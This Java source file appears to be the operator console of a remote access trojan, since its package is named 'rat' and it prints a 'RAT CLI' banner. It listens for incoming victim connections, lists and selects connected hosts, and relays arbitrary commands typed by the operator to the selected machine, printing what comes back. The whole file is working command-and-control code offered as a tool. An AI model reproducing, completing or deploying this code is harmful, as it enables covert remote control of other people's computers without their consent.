package rbstyle.rat;

import java.io.IOException;
import java.net.Socket;
import java.util.Scanner;

public class Main {
	
	public static void main(String[] args) throws IOException {
		new Client("127.0.0.1");
		
		if(true) return;
		Server server = null;
		Scanner scanner = new Scanner(System.in);
		boolean run = true;
		Socket selected;
		String cmd;
		String token[];
		
		System.out.println("RAT CLI");
		while(run) {
			System.out.print("$ ");
			cmd = scanner.nextLine();
			token = cmd.split(" ");
			switch(token[0]) {
				case "start":
					server = new Server(Integer.parseInt(token.length>1?token[1]:"1111"));
					break;
				case "stop":
					if(server==null) {
						System.out.println("Connection has not yet started. Consider calling: start, start [port]");
						break;
					}
					if(token.length>1) {
						 //Server.stopListening(Integer.parseInt(token[1]));
					}else
						server.stopListening();
					break;
				case "exit":
					System.out.println("Closing...");
					if(server!=null)
						server.stopListening();
					run = false;
					scanner.close();
					System.out.println("Exiting...");
					System.exit(0);
					break;
				case "show":
					if(server==null) {
						System.out.println("Connection has not yet started. Consider calling: start, start [port]");
						break;
					}
					if(server.connectionsLen()<=0) {
						System.out.println("Nothing to display: 0 connections");
						break;
					}
					
					System.out.println("Fetching..");
					for(Socket s : server.getConnections())
						System.out.println(s.getInetAddress().toString());
					break;
				case "select":
					if(server==null) {
						System.out.println("Connection has not yet started. Consider calling: start, start [port].");
						break;
					}
					if(server.connectionsLen()<=0) {
						System.out.println("No Connections.");
						break;
					}
					int sel = Integer.parseInt(token.length>1?token[1]:"0");
					if(sel<0 && sel>server.connectionsLen()) {
						System.out.println("Out of range.");
						break;
					}
					selected = server.getConnections().get(sel);
					System.out.println(selected.getInetAddress().toString()+" has been selected.");
					boolean step2 = true;
					while(step2) {
						if(selected == null) break;
						System.out.print("$ ");
						cmd = scanner.nextLine();
						if(cmd.contains("unselect")) break;
						send(server,selected,cmd);
					}
					break;
				default:
					System.out.println("Unknown command. Consider using:");
					System.out.println("start, start [port], stop, exit, show, select, select [index]");
			}
		}
	}
	
	static void send(Server server, Socket client, String data) throws IOException {
		System.out.println("Sending Request...");
		server.send(client, data);
		System.out.println("Receiving...");
		System.out.println();
		String response = server.receive(client);
		response = response.replaceAll("\\n", "\n");
		response = response.replaceAll("\\t", "\t");
		System.out.println(response);
		System.out.println();
	}

}
